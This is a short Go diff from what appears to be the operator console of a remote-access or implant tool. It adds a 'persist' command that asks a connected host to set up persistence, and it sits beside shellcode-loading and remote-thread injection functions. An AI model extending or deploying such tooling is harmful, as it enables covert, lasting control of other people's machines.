@@ -301,6 +301,27 @@ func load(conn *net.Conn, fileWShellcode string) {
 	fmt.Println()
 }
 
+func persist(conn *net.Conn, fileName string) {
+	fmt.Println(fileName)
+	(*conn).Write([]byte("persist\n"))
+	buffer := make([]byte, 100)
+	read_len, err := (*conn).Read(buffer)
+	if err != nil {
+		fmt.Println("[-]Error Reading From Buffer")
+		return
+	}
+	if read_len <= 1 {
+		fmt.Println("[-]Error with length of Buffer")
+		return
+	}
+	bufferSnapped := buffer[:read_len]
+	bufferStr := string(bufferSnapped)
+	if bufferStr != "OK\n" {
+		fmt.Println("[-]Something went wrong creating persistance")
+		return
+	}
+}
+
 // Continue this later
 func remoteThread(conn *net.Conn, fileWShellcode string, pid string) {
 	fmt.Println()
